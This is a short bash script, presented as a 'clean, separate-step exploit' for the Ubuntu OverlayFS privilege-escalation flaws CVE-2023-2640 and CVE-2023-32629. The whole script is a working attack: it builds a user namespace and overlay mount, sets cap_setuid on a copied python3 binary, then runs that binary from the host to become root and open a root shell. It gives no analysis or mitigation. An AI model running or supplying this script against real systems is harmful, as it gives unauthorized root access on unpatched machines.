#!/bin/bash
# Clean, separate-step exploit for CVE-2023-2640 / CVE-2023-32629

# 1. Clear environment workspace
cd /tmp && rm -rf l u w m

# 2. Build the exploit inside the temporary namespace sandbox
unshare -rm sh -c "mkdir l u w m && cp /usr/bin/python3 l/ && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*"

# 3. Execute the backdoored file from the REAL host context to escape the namespace
./u/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
